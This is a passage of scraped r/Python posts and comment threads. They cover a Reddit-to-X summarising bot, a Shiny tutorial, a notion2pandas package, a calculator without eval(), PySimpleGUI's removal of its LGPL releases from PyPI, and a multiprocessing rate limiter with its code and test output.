    "post_content": "What My Project Does\nThis is a small Python script that runs inside a Google Sheet by way of the Python add-on. It uses the reddit api to fetch posts from Ask Reddit twice daily. For posts with enough upvotes, it uses the OpenAI API to summarize an answer to the question based on the comments. I then inserts any new questions and their answers into the spreadsheet and uses the Twitter APIto also post the answer to Twitter I mean X. Should be interesting to anybody looking to connect (a subset) of those APIs.\nTarget Audience\nAnybody who is looking to mash-up different APIs (Python is great at this and I feel like it is getting a little harder to do this every year).\nComparison\nI'm not aware of any Python code that does this. Even finding a good example of the V2 twitter API is harder than it seems. To accomplish some of this, you could try to ask ChatGPT directly to summarize the answers for a url but when I tried it said it couldn't access Reddit.\nResource\nThe spreadsheet where this happens\nThe twitter bot in action\nThe source code (or make a copy of the spreadsheet to see)",
    "comments": [
        {
            "author": "rthidden",
            "score": "2",
            "content": "Neat idea! How do you like the results? I'm curious why you went with Google Sheets and what else you considered.",
            "replies": [
                {
                    "author": "DouweOsinga",
                    "score": "2",
                    "content": "Thanks! I think the results are really kinda nice to browse; it's early days but it does give you an idea of the answers and if you like something you can always click through. Google Sheets seems like a good way to share results like this. The alternative is spinning up your own website; maybe something like streamlit would be doable but you'd still need a database however light. So this feels like a good compromise"
                }
            ]
        },
        {
            "author": "clesiemo3",
            "score": "1",
            "content": "Your reddit client and secret are in the source code fyi",
            "replies": [
                {
                    "author": "DouweOsinga",
                    "score": "3",
                    "content": "Oops. Thanks"
                }
            ]
        }
    ]
},
{
    "post_author": "jgloewen",
    "post_id": "1d9lsgd",
    "post_score": "0",
    "post_time": "Thursday, June 6, 2024 at 7:03:55 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Tutorial: How To Create Professional Python Shiny Dashboards In A Jiffy",
    "media": [
        "https://johnloewen.substack.com/p/professional-python-shiny-dashboards"
    ],
    "post_content": "The Python Shiny library is a framework for building interactive web applications in Python.\nDeveloped by RStudio, the same team behind the Shiny library for R, this library is particularly useful for data scientists and analysts who want to build interactive dashboards and applications without having extensive front-end development skills.\nAll that is needed is knowledge of the Shiny user interface Application Programming Interface (API).\nPython Shiny can be used to develop applications that allow users to interact with data in real time. Data scientists can quickly prototype data applications and share them with anyone.\nHow easy is it to use? Let’s use a simple data set and a basic interactive data visualization to take it for a test drive.\nFree article HERE.",
    "comments": [
        {
            "author": "riklaunim",
            "score": "9",
            "content": "That's not a dashboard nor \"profressional\", that's like one page with 2 widgets. Make a full dashboard with routing with good UX and performance and then we can talk about it.",
            "replies": [
                {
                    "author": "TTechTex",
                    "score": "1",
                    "content": "Have any examples of a tutorial with what you are talking about?"
                }
            ]
        },
        {
            "author": "SittingWave",
            "score": "1",
            "content": "After having spent 4 years with that framework, language, and community, I can confidently say it is welcome to burn in hell.",
            "replies": [
                {
                    "author": "thebillyzee",
                    "score": "1",
                    "content": "how come?"
                }
            ]
        },
        {
            "author": "databot_",
            "score": "0",
            "content": "I've tried Shiny Python recently and it's quite good. I have some experience with Shiny R and the API is pretty similar. If you're looking for hosting, check this out."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1d7jhlf",
    "post_score": "2",
    "post_time": "Tuesday, June 4, 2024 at 3:00:12 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "Jaeger1987",
    "post_id": "1d7vc3k",
    "post_score": "11",
    "post_time": "Tuesday, June 4, 2024 at 2:57:58 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Notion2Pandas: A new python package to import Notion Database into Pandas framework and viceversa",
    "media": [
        "https://gitlab.com/Jaeger87/notion2pandas"
    ],
    "post_content": "What My Project Does\nHello everyone! I've just released a new Python package, notion2pandas, which allows you to import a Notion database into a pandas dataframe with just one line of code, and to update a Notion database from a pandas dataframe also with just one line of code.\nTarget Audience\nWhether you're a data scientist, a data engineer, a Python enthusiast, or just curious, 'pip install notion2pandas' from the terminal, follow the tutorial in the README, and happy coding!\n🔗 GitLab repo: https://gitlab.com/Jaeger87/notion2pandas\nKey Features\nEasy to use. import in a single line of code, export with another single line of code\nNo more boring parsing. You can import any Notion Database in a pandas framework\nFlexibility. If you don't like the default parsing mode of a data provided by notion2pandas, you can use your own parse function for a specific kind of data.\nMaintainability. If Notion broke something with an update, the possibility to provide a different parsing function allows you to use Notion2Pandas even if it's not updated with latest notion update.\nQuick Start\nIn the ReadMe you can find everything you need to start.\nComparison\nWhen I started this project, I couldn't find anything capable of transforming a Notion database into a pandas DataFrame without specifying how to parse the data.\nIf you got any kind of feedback I'm really curious to read it!",
    "comments": [
        {
            "author": "Ok_Expert2790",
            "score": "4",
            "content": "Few things - No tests mate, get a test suite up and running ASAP :) Also, the idea of having a bunch of lambdas as instance attributes… seems kinda like an anti pattern/confusing to me? I would change these into static methods, and opt for the most basic and “full plate” of data to be returned as a dataframe from the client, then the user does not need to override those attributes but adjust the DF when it’s returned instead",
            "replies": [
                {
                    "author": "Jaeger1987",
                    "score": "1",
                    "content": "Hi! Thanks for the feedback! Regarding the tests, you are absolutely right. On my roadmap I have to implement the CI/CD with automatic tests. However, since I have to interact with external databases (Notion), it will be problematic if a test fails, leaving the database \"dirty.\" I'll come up with something to restore it if needed, but yes, tests are necessary! As for the lambdas, initially, I also thought about exposing overridable static methods. Then, I got the impression that it might be less convenient for the user to change them, so I thought this more straightforward approach might be more convenient for the user (at least in my opinion). Regarding returning the most basic dataframe, the basic implementation of notion2pandas already gives you a very generic version that probably satisfies most use cases. There are only a few pieces of data that require specific preferences (the most common being dates), so this solution seemed more convenient to me as well. However, I'm open to changing it if many users prefer your suggested approach.",
                    "replies": [
                        {
                            "author": "toxic_acro",
                            "score": "2",
                            "content": "If you want to stick with the assigning functions in the _init_, you can define them as regular functions outside the class and just assign them by name That will allow you to write docstrings/type hints/etc",
                            "replies": [
                                {
                                    "author": "Jaeger1987",
                                    "score": "1",
                                    "content": "I'm not sure to understand completely, could you please provide me a piece of pseudo code to better understand?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "pan0ramic",
            "score": "3",
            "content": "i'm sharing with my colleagues that work at Notion :)",
            "replies": [
                {
                    "author": "Jaeger1987",
                    "score": "1",
                    "content": "🙏🙏🙏🙏🙏"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1d6r5fc",
    "post_score": "6",
    "post_time": "Monday, June 3, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "[deleted]",
    "post_id": "d3mvh0",
    "post_score": "2860",
    "post_time": "Friday, September 13, 2019 at 12:48:29 PM GMT+3",
    "flair_text": "",
    "post_title": "I made a python drawing",
    "media": [
        "https://external-preview.redd.it/uUqPhqd4jhzj215NXvc0etBUSHFPC-OFNSeWmcEWyt0.png?width=640&crop=smart&format=pjpg&auto=webp&s=eee591b5c2426bee2b656d43bd131e95a87dabdb"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "treetyoselfcarol",
            "score": "72",
            "content": "Pull the lever Kronk!"
        },
        {
            "author": "Kintoki74",
            "score": "164",
            "content": "Absolute madlad",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "101",
                    "content": "Thanks lol I'm not too advanced so it took 7 hours",
                    "replies": [
                        {
                            "author": "jdero",
                            "score": "87",
                            "content": "Hey cheers on you for spending 7 hours building something cool. Many people give up with a half finished result, kudos on your diligence and congrats with your end product."
                        }
                    ]
                }
            ]
        },
        {
            "author": "maelinya",
            "score": "32",
            "content": "Wait this reminds me of that educational programming language from like the 90s with the turtle cursor. Did y'all ever use that? I've got such a dim memory of it."
        },
        {
            "author": "[deleted]",
            "score": "30",
            "content": "Hats off. Masterpiece"
        },
        {
            "author": "just_just_regrets",
            "score": "21",
            "content": "Its all coming together"
        },
        {
            "author": "SnicSnac",
            "score": "14",
            "content": "Code maybe?"
        },
        {
            "author": "trimlimdim",
            "score": "8",
            "content": "Turtle?"
        },
        {
            "author": "AfghanRat",
            "score": "6",
            "content": "Could you put the code on github? I'd really love to read it"
        },
        {
            "author": "jonr",
            "score": "5",
            "content": "Ah yes, the drawing."
        }
    ]
},
{
    "post_author": "Murpho19",
    "post_id": "go6no5",
    "post_score": "2490",
    "post_time": "Friday, May 22, 2020 at 1:20:40 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Spotlightify - a overlay controller for spotify, allowing you to quickly control your music without distraction. Please let me know if you are interested in this application as I am thinking of making it public on my github in the near future (once more features have been developed), thanks!",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "Murpho19",
            "score": "156",
            "content": "This application was developed using pyqt5 and spotipy Edit: Thanks to everyone who upvoted and commented I really appreciate it. I am working to get this code up on github as soon as possible and after that would very much welcome contributions. Thanks again!",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "19",
                    "content": "Awesome! I'm very interested to see how you designed it."
                },
                {
                    "author": "acidic_orbit",
                    "score": "14",
                    "content": "Apart from the Application I'm also interested in that wallpaper",
                    "replies": [
                        {
                            "author": "lordp",
                            "score": "8",
                            "content": "https://wall.alphacoders.com/big.php?i=848687"
                        }
                    ]
                },
                {
                    "author": "Murpho19",
                    "score": "3",
                    "content": ""
                },
                {
                    "author": "rBressan",
                    "score": "2",
                    "content": "",
                    "replies": [
                        {
                            "author": "Murpho19",
                            "score": "2",
                            "content": ""
                        },
                        {
                            "author": "Murpho19",
                            "score": "2",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "",
                    "replies": [
                        {
                            "author": "Sixkillers",
                            "score": "4",
                            "content": ""
                        }
                    ]
                }
            ]
        },
        {
            "author": "SupahNoob",
            "score": "91",
            "content": ""
        },
        {
            "author": "5ider",
            "score": "25",
            "content": "This is soo good! If you open source it, I’d love To help contribute :)"
        },
        {
            "author": "soap1337",
            "score": "32",
            "content": "Yep 11/12 would use."
        },
        {
            "author": "goobabo22",
            "score": "36",
            "content": "Yo dude. What are you doing on reddit, sell this to spotify themselves! That feels so integrated! Stellar job!"
        },
        {
            "author": "Panda_Mon",
            "score": "24",
            "content": "This is too much typing for me. It negates the value so much that I would use the full UI instead. I recommend to go full hotkey mode. You are reducing commands to key presses instead of mouse clicks, and there are only so many commands. Lets get rid of all unnecessary key presses. Once I open the interface, just show a search bar where typing a song is optional, and have icons with keys below. Example: play/\"P\", Queue/\"Q\", etc. When you press a key, show the cached values for that action and allow searching for a brand new value. When you type in the search bar, allow you to pick a song and then use the hotkeys to pick a function."
        },
        {
            "author": "Techeavy",
            "score": "11",
            "content": "That my friend is awesome! Where did you find the wallpaper?"
        },
        {
            "author": "RubberFistOfJustice",
            "score": "5",
            "content": "ctrl +space to exit would probably be better. this looks fantastic. this is my fav feature on mac os"
        },
        {
            "author": "nekogareth",
            "score": "5",
            "content": "I am once again asking for the source code"
        }
    ]
},
{
    "post_author": "Zorgon-589",
    "post_id": "1d5wz32",
    "post_score": "0",
    "post_time": "Sunday, June 2, 2024 at 12:11:24 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Calculator without eval()",
    "media": [
        "https://github.com/Zorgon589/Calculator/tree/main"
    ],
    "post_content": "WHAT MY PROJECT DOES: Solves basic arithmetic problems in an interactive way in python.\nTARGET AUDIENCE: Anyone, it's just a program to get practice using loops, lists, and functions.\nCOMPARISON: This program functions as a calculator without the use of the eval() function to make everything superfluously easy. It's not perfect and my next version is gonna try and address queries with parenthesis and multiple operators!\nSee the below link for github: https://github.com/Zorgon589/Calculator/tree/main",
    "comments": [
        {
            "author": "chunkyasparagus",
            "score": "35",
            "content": "First things first, make the calculate logic into a function, and separate that from the rest of the code. You can run the input loop in another function called from the if __name__ == '__main__' block. Read up on the python style guide in PEP 8. You could then make it recursive where, after splitting by operator, call calculate on each part before doing the operation. If there is no operator found, validate that the input was a number and just return it.",
            "replies": [
                {
                    "author": "Zorgon-589",
                    "score": "11",
                    "content": "PEP 8, huh? Okay, I'll try looking into that. This was my first project that I tried to do on my own, so it's definitely, uh, ameatur *"
                }
            ]
        },
        {
            "author": "TheGuyWithoutName",
            "score": "13",
            "content": "Welcome to the world of writing your own interpreter :). If you want your calculator to work properly I'd suggest you to follow this video series https://youtu.be/TwKWUj033vY It will teach how how to write an arithmetic parser and offer you an insight on how programming languages understand your code.",
            "replies": [
                {
                    "author": "Zorgon-589",
                    "score": "2",
                    "content": "Thanks for the info! I'll definitely be doing more research before my version 2"
                }
            ]
        },
        {
            "author": "Jacks-san",
            "score": "12",
            "content": "You can just use one operator at a time right ? Because if you query \"2+22\" it will throw an error since you split on \"\" and try to float(\"2+2\")",
            "replies": [
                {
                    "author": "Zorgon-589",
                    "score": "2",
                    "content": "Yeah. Trying to use more than one operator won't work with how I have it here. I'm gonna have to think of something to make it work",
                    "replies": [
                        {
                            "author": "LuciferK9",
                            "score": "4",
                            "content": "Look for \"Pratt parser\""
                        }
                    ]
                }
            ]
        },
        {
            "author": "13p14",
            "score": "5",
            "content": "Why do you have Calculator.py and Calculator V1.2.py?",
            "replies": [
                {
                    "author": "Zorgon-589",
                    "score": "4",
                    "content": "So, I have a mentor who's been teaching me to code. Calculator V1.2 is the version where he went over my base code with me and we cleaned it up to be less redundant"
                }
            ]
        },
        {
            "author": "ArtOfWarfare",
            "score": "4",
            "content": "I recommend you use ast.parse(). That’s the official method for parsing Python code before it’s executed. Then you can walk through the tree evaluating each node to come up with the final answer to return to the user. Docs for ast.parse(): https://docs.python.org/3/library/ast.html#ast.parse"
        },
        {
            "author": "Proof-Ad2610",
            "score": "3",
            "content": "Nice work, you have the same project as me, https://github.com/Lunaluvg/Calculator-without-using-eval-.git",
            "replies": [
                {
                    "author": "Zorgon-589",
                    "score": "3",
                    "content": "That's so cool! I'll have to take a look and compare when I get home tonight."
                }
            ]
        },
        {
            "author": "TheRNGuy",
            "score": "1",
            "content": "Better use AST What if you have query like \"1 + 1\" or \"1 +1\", it should be valid. Or even better, make it with UI. Only numbers, operations, backspace and enter would work.",
            "replies": [
                {
                    "author": "Proof-Ad2610",
                    "score": "1",
                    "content": "https://github.com/Lunaluvg/Calculator-without-using-eval-.git , I've worked on this project and just finished recently."
                }
            ]
        }
    ]
},
{
    "post_author": "ManyInterests",
    "post_id": "1d8d4iv",
    "post_score": "392",
    "post_time": "Wednesday, June 5, 2024 at 3:44:45 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "PSA: PySimpleGUI has deleted [almost] all old LGPL versions from PyPI; update your dependencies",
    "media": [
        "https://pypi.org/help/#yanked",
        "https://github.com/spyoungtech/FreeSimpleGUI"
    ],
    "post_content": "Months ago, PySimpleGUI relicensed from LGPL3 to a proprietary license/subscription model with the release of version 5 and nuked the source code and history from GitHub. Up until recently, the old versions of PySimpleGUI remained on PyPI. However, all but two of these have been deleted and those that remain are yanked.\nThe important effect this has had is anyone who may have defined their requirements as something like PySimpleGUI<5 or PySimpleGUI==4.x.x for a now-deleted version, your installations will fail with a message like:\nERROR: No matching distribution found for pysimplegui<5\nIf you have no specific version requested for PySimpleGUI you will end up installing the version with a proprietary license and nagware.\nThere are three options to deal with this without compeltely changing your code:\nSpecify the latest yanked, but now unsupported version of PySimpleGUI PySimpleGUI==4.60.5 and hope they don't delete that some time in the future\nUse the supported LGPL fork, FreeSimpleGUI (full disclosure, I maintain this fork)\nPay up for a PySimpleGUI 5 license.",
    "comments": [
        {
            "author": "ManyInterests",
            "score": "87",
            "content": "As a separate note, you can see up to this point, most downloads have not been for version 5. After they did this, downloads for 4.x suddenly plummet from ~24K/day to less than 2K/day and downloads for 5.x jump from 4K/day to 25K/day. It's concerning because I doubt that those additional 21,000 daily downloaders have suddenly decided to purchase a PySimpleGUI 5 license. Though, it's probably mostly automated downloads anyhow. Also noteworthy that the most-downloaded version, 4.60.4 (prevously, the higest non-yanked 4.x version) with 20K/day downloads, has been deleted!"
        },
        {
            "author": "jcrowe",
            "score": "165",
            "content": "I have been a vocal proponent of this package in the past. Not any longer. It’s a pretty crappy way to run an open source project.",
            "replies": [
                {
                    "author": "ManyInterests",
                    "score": "91",
                    "content": "Yeah, it was promoted pretty heavily here on Reddit, too. It's a shame how he went from \"I'm just learning Python here's something cool I made\" to rugpull in such a short time. Also a pretty unsavory way to run the company, too, in my estimation. I can understand (but don't necessarily support) the move to relicense future versions to a proprietary model -- it's his software after all. But turning around and engaging in a scorched-earth policy directly against your actual potential addressable market is a really bad business move.",
                    "replies": [
                        {
                            "author": "marr75",
                            "score": "70",
                            "content": "I can understand the move to relicense future versions to a proprietary model As a CTO for teams that use Python, this is chilling. We review licenses at the time of inclusion, and any time it comes up ad-hoc while ensuring that dev, test, and deployment all adhere to the license terms. We have automated systems to try and detect the insertion of malware in dependencies, but I'd guess very few teams have automated systems to detect a license change that puts them in violation. It's bad for open source and bad for the author. I wouldn't do business with them because they've proven they'll make sneaky changes to agreements. I don't need that kind of problem lying around even if the practical exposure is relatively small.",
                            "replies": [
                                {
                                    "author": "ManyInterests",
                                    "score": "19",
                                    "content": "Agreed on all points. Managing dependencies is a huge challenge with all the moving parts that change outside of your normal lifecycle. Tools help, but there's a lot you need to do to make sure those tools work accurately and for their intended purpose -- and then tracking where/when your software ships after you've got the bill of materials is a whole other thing... you may have patched a vulnerable library, but did all your dependents update? And if they updated, did they ship that update to production? Was it rolled back? Etc."
                                },
                                {
                                    "author": "rmcoder",
                                    "score": "8",
                                    "content": "Sorry for being off topic. But what kind of systems/tools do you use to automatically detect license changes and malware?"
                                },
                                {
                                    "author": "Halkcyon",
                                    "score": "1",
                                    "content": ""
                                }
                            ]
                        },
                        {
                            "author": "billsil",
                            "score": "8",
                            "content": "It was a few years. I use my open source project more for my own self promotion and my own puzzle. It's not that special. I just decided to do it. Redoing PySimpleGUI would honestly not be that hard. It's a large scope, but it's supposed to be simple, so limit it. It makes me all the more confused that the author decided to pull it.",
                            "replies": [
                                {
                                    "author": "ManyInterests",
                                    "score": "14",
                                    "content": "Yeah, that's a fair assessment. It's not like the code in PySimpleGUI is particularly great code, anyhow. But it did get some important things right about the general interface for just getting things done. I think the idea of defining layouts in list matrices is what fits people's brains the most and makes it easier to use than available alternatives. But after personally having worked through tens of thousands of lines of PySimpleGUI code, I agree there's nothing special in there, but it is a lot of nothing special that, in sum, becomes pretty useful. Anyhow. FreeSimpleGUI is focused on maintaining compatibility with preexisting PySimpleGUI users so that part of the community remains well-served by an open source option. I have ideas for how the 'good parts' could be adapted into something even better, but it would be a separate project entirely."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "SittingWave",
                    "score": "16",
                    "content": "It was clear from the get go. I also was a strong proponent against this package, for two reasons: first, its design teaches awful practices when it comes to UI design. Second, the author was constantly spamming it as a solution to the point of obnoxiousness. It was clear what the end game was going to be. And here it is."
                }
            ]
        },
        {
            "author": "lacifuri",
            "score": "110",
            "content": "Never thought PySimpleGUI, of all libraries, will become subscription based.",
            "replies": [
                {
                    "author": "Leseratte10",
                    "score": "165",
                    "content": "PySimpleGUI is the one library where I expected that the most. Couple years ago I reported a bug ( https://github.com/PySimpleGUI/PySimpleGUI/issues/3529 ) and the corresponding two-line bugfix in a merge request. Despite me putting that change into the public domain, it only being a small bugfix, and multiple other people commenting it fixes the issue, the maintainer said: We don't take pull requests (there's not a single merged PR on GitHub) this project is managed like a closed-source project this bug is not important so it'll have a low priority and then, two years later \"When I set this obscure nondefault parameter in my KDE / Linux configuration the bug is no longer visible (but of course still present) so it must be user error\" and closed the issue report. That was the point where I was like \"okay this is a shitty library with shitty practices, I should migrate to something else\", and it looks like I made the right choice. To this day, it looks like the bug still isn't fixed."
                }
            ]
        },
        {
            "author": "theanine3D",
            "score": "23",
            "content": "Thank you for this. I had a project on GitHub that used PySimpleGUI as a dependency and now I just went and updated it to use FreeSimpleGUI instead. ✌️"
        },
        {
            "author": "simism",
            "score": "21",
            "content": "Thanks for doing your duty and hard forking a project that strayed from its commitment to open source."
        },
        {
            "author": "ffiarpg",
            "score": "16",
            "content": "Thank you so much for maintaining a fork. I use this package for several projects."
        },
        {
            "author": "AdventurousMinute334",
            "score": "25",
            "content": "What a dick move! I totally understand that you might change your licence but it's a really bad to delete all packages since before that and break it for all users. I wouldn't never trust them again but they will slowly fail and be forgotten now."
        },
        {
            "author": "chillaranand",
            "score": "43",
            "content": "I would recommend switching to https://github.com/spyoungtech/FreeSimpleGUI It is a free drop-in replacement. cc: u/ManyInterests",
            "replies": [
                {
                    "author": "ManyInterests",
                    "score": "52",
                    "content": "Yes! That's my package, as mentioned in the post :-)"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "15",
            "content": "Switching to FreeSimpleGUI should just be a matter of changing the package name in requirements.",
            "replies": [
                {
                    "author": "gromain",
                    "score": "4",
                    "content": "Switching to FreeSimpleGUI should just be a matter of changing the package name in requirements."
                }
            ]
        },
        {
            "author": "_throawayplop_",
            "score": "11",
            "content": "While I can totally understand going to a closed source licence, removing older free software version is a disgusting move"
        },
        {
            "author": "sanitylost",
            "score": "5",
            "content": "so, it's a much larger requirement, but in terms of GUI, NiceGUI has been fantastic for me so far. If you're using it for basic things, it's pretty straight forward but has the options to do some more complex actions."
        },
        {
            "author": "noeldc",
            "score": "3",
            "content": "I'm going to start playing with Custom Tkinter."
        },
        {
            "author": "KrazyKirby99999",
            "score": "3",
            "content": "I prefer pyside6, but It's good to know to recommend FreeSimpleGUI over PySimpleGUI"
        },
        {
            "author": "ghostofwalsh",
            "score": "3",
            "content": "They honestly should not let shit like this into PyPI",
            "replies": [
                {
                    "author": "ManyInterests",
                    "score": "5",
                    "content": "Distributing commercial software on PyPI did make me scratch my head, too. Normally you wouldn't do this because you make certain warranties by doing so and license certain rights for PyPI users when you upload, under the terms of use. Legally, it's an unncessary risk if you care about your IP. As I've heard in this comment, PySimpleGUI 5 obfuscates its code (which, perhaps, could be, poorly, argued as a 'reasonable measure' for protecting a trade secret), but by uploading to PyPI, they warrant that nothing in there is a trade secret, for example."
                }
            ]
        }
    ]
},
{
    "post_author": "VoyZan",
    "post_id": "1d7rvd2",
    "post_score": "10",
    "post_time": "Tuesday, June 4, 2024 at 11:03:36 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Rate Limiting + Multiprocessing = Nightmare? But I think I've found one nice way to do it 🤞",
    "media": [
        "https://pypi.org/project/ratelimiter/",
        "https://docs.python.org/3/library/multiprocessing.html#multiprocessing.managers.SyncManager.Value",
        "https://docs.python.org/3/library/multiprocessing.html#multiprocessing.managers.SyncManager.Lock",
        "https://gist.github.com/justinvanwinkle/d9f04950083c4554835c1a35f9d22dad",
        "https://docs.python.org/3/library/multiprocessing.html#multiprocessing.managers.SyncManager",
        "https://gist.github.com/Voyz/1b6857f6d7b9ada024e3d2529bba8f4c",
        "https://docs.python.org/3/library/threading.html#threading.Condition.notify",
        "https://docs.python.org/3/library/multiprocessing.html#module-multiprocessing.connection",
        "https://stackoverflow.com/questions/6920858/interprocess-communication-in-python",
        "https://gist.github.com/Voyz/8c3b464e151af1c3b2d2e99a2a1a7fc9",
        "https://docs.python.org/3/library/multiprocessing.html#multiprocessing.managers.SyncManager.Condition",
        "https://stackoverflow.com/a/65377770/3508719",
        "https://stackoverflow.com/questions/40748687/python-api-rate-limiting-how-to-limit-api-calls-globally",
        "https://pypi.org/project/ratelimit/",
        "https://stackoverflow.com/questions/69907453/lock-objects-should-only-be-shared-between-processes-through-inheritance",
        "https://github.com/python/cpython/issues/79967#issuecomment-1455216546",
        "https://github.com/JWCook/requests-ratelimiter",
        "https://pypi.org/project/ratemate/",
        "https://stackoverflow.com/questions/69306420/rate-limit-api-multi-process"
    ],
    "post_content": "If you're interested in Python multiprocessing, I'd appreciate if you read this and share your thoughts:\ntl;dr: I've implemented a cross-process request rate limiter, allowing for N requests per T seconds. See it in this Gist.\nProblem\nRequest rate limiting (or throttling) requires a place in memory to track the the amount of calls already made - some kind of counter. Multiprocessing is not great at having a single shared variable.\nI have a use case for a multiprocessing system in which each process can make a number of requests to a REST API server. That server imposes a 1000 requests per minute limit. Hence I needed a way to implement a rate limiter that would work across processes and threads.\nI've spent the past 2 days digging through a ton of SO posts and articles suggesting how to do it, and I came at a few bad solutions. I finally came up with one that I think works quite well. It uses a multiprocessing.Manager, and its Value, Lock and Condition proxies.\nSolution\nI've created a CrossProcessThrottle class which stores that counter. The way that the information about the counter is shared with all the processes and threads is through a ThrottleBarrier class instance. Its wait method will do the following:\ndef wait(self):\n    with self._condition:\n        self._condition.wait()\n\n    with self._lock:\n        self._counter.value += 1\nWait for the shared Condition - this will stop all the processes and their threads and keep them dormant.\nIf the CrossProcessThrottle calculates that we have available requests (ie. the counter is below max_requests, so we don't need to limit the requests), it uses Condition.notify(n) (docs) in order to let n amount of threads through and carry out the request.\nOnce approved, each process/thread will bump the shared Value, indicating that a new request was made.\nThat Value is then used by the CrossProcessThrottle to figure out how many requests have been made since the last check, and adjust its counter. If counter is equal or greater than max_requests, the Condition will be used to stop all processes and threads, until enough time passes.\nThe following is the example code using this system. You can find it in this Gist if you prefer.\nimport datetime\nfrom concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor\n\nfrom ratelimiter import ThrottleBarrier, CrossProcessesThrottle\n\n\ndef log(*args, **kwargs):\n    print(datetime.datetime.now().strftime('[%H:%M:%S]'), *args, **kwargs)\n\n\ndef task(i, j, throttle_barrier: ThrottleBarrier):\n    # This will block until there is a free slot to make a request\n    throttle_barrier.wait() \n    log(f'request: {i:2d}, {j:2d}  (process, thread)')\n    # make the request here...\n\n\ndef worker(i, throttle_barrier: ThrottleBarrier):\n    # example process worker, starting a bunch of threads\n    with ThreadPoolExecutor(max_workers=5) as executor:\n        for j in range(5):\n            executor.submit(task, i, j, throttle_barrier)\n\n\nif __name__ == '__main__':\n    cross_process_throttle = CrossProcessesThrottle(max_requests=3, per_seconds=10)\n    throttle_barrier = cross_process_throttle.get_barrier()\n\n    log('start')\n    futures = []\n    # schedule 9 jobs, which should exceed our limit of 3 requests per 10 seconds\n    with ProcessPoolExecutor(max_workers=10) as executor:\n    \n        for i in range(3):\n            futures.append(executor.submit(worker, i, throttle_barrier))\n\n        while len(futures):\n            # calling this method carries out the rate limit calculation\n            cross_process_throttle.cycle()\n\n            for future in futures:\n                if future.done():\n                    futures.remove(future)\n\n    log('finish')\nI've uploaded the source code for CrossProcessThrottle and ThrottleBarrier as a Gist too. Calculating the counter is a bit more code, so I refrain from sharing it here, but in a nutshell:\nStore the last amount of requests made as last_counter, initialised as 0\nEvery time the cycle() is called, compare the difference between the current counter and the last_counter\nThe difference is how many requests have been made since the last check, hence we increment the counter by that many.\nWe calculate how many calls remaining are allowed: remaining_calls = max_requests - counter\nAnd notify that many threads to go ahead and proceed: condition.notify(remaining_calls)\nThe actual process is a little more involved, as at the step 3 we need to store not only the amount of calls made, but also the times they've been made at - so that we can be checking against these later and decrease the counter. You can see it in detail in the Gist.\nIf you've read through the code - what are your thoughts? Am I missing something here? In my tests it works out pretty nicely, producing:\n[14:57:26] start\n[14:57:26] Calls in the last 10 seconds: current=0 :: remaining=3 :: total=0 :: next slot in=0s\n[14:57:27] request:  0,  1  (process, thread)\n[14:57:27] request:  0,  0  (process, thread)\n[14:57:27] request:  0,  2  (process, thread)\n[14:57:31] Calls in the last 10 seconds: current=3 :: remaining=0 :: total=3 :: next slot in=7s\n[14:57:36] Calls in the last 10 seconds: current=3 :: remaining=0 :: total=3 :: next slot in=2s\n[14:57:38] request:  0,  4  (process, thread)\n[14:57:38] request:  0,  3  (process, thread)\n[14:57:38] request:  1,  0  (process, thread)\n[14:57:41] Calls in the last 10 seconds: current=3 :: remaining=0 :: total=6 :: next slot in=7s\n[14:57:46] Calls in the last 10 seconds: current=3 :: remaining=0 :: total=6 :: next slot in=2s\n[14:57:48] request:  2,  0  (process, thread)\n[14:57:48] request:  1,  1  (process, thread)\n[14:57:48] request:  1,  2  (process, thread)\n[14:57:51] Calls in the last 10 seconds: current=3 :: remaining=0 :: total=9 :: next slot in=8s\n[14:57:56] Calls in the last 10 seconds: current=3 :: remaining=0 :: total=9 :: next slot in=3s\n[14:57:59] request:  2,  4  (process, thread)\n[14:57:59] request:  2,  2  (process, thread)\n[14:57:59] request:  2,  1  (process, thread)\n[14:58:01] Calls in the last 10 seconds: current=3 :: remaining=0 :: total=12 :: next slot in=8s\n[14:58:06] Calls in the last 10 seconds: current=3 :: remaining=0 :: total=12 :: next slot in=3s\n[14:58:09] request:  1,  3  (process, thread)\n[14:58:09] request:  1,  4  (process, thread)\n[14:58:09] request:  2,  3  (process, thread)\n[14:58:10] finish\nI've also tested it with 1000s scheduled jobs to 60 processes, each spawning several threads, each of which simulates a request. The requests are limited as expected, up to N per T seconds.\nI really like that I can construct a single ThrottleBarrier instance that can be passed to all processes and simply call the wait method to get permission for a request. It feels like an elegant solution.\nResearch\nThere are a bunch of libraries for rate limiting, some claiming to support multiprocess, however I couldn't get them to do so:\nhttps://pypi.org/project/ratelimit/\nhttps://pypi.org/project/ratelimiter/\nhttps://pypi.org/project/ratemate/\nhttps://github.com/JWCook/requests-ratelimiter\nThere's a few SO threads and posts discussing the process too, however they either don't consider multiprocessing, or when they do they don't allow using ProcessPoolExecutor:\nhttps://stackoverflow.com/questions/69306420/rate-limit-api-multi-process\nhttps://stackoverflow.com/questions/40748687/python-api-rate-limiting-how-to-limit-api-calls-globally\nhttps://gist.github.com/justinvanwinkle/d9f04950083c4554835c1a35f9d22dad\nhttps://stackoverflow.com/questions/6920858/interprocess-communication-in-python\nThe issue with ProcessPoolExecutor comes up when you try to use shared resources as it raises an error along the lines of:\nSynchronized objects should only be 